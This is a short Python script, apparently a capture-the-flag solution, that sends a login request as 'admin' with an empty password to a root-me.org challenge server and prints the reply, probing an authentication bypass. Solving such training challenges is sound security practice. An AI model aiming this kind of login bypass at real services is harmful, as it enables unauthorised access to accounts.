#!/usr/bin/env python3
import requests


body = {"user":"admin",
        "password":'',}

r = requests.post("http://ctf10k.root-me.org:6006/auth",json=body)

print(r.text)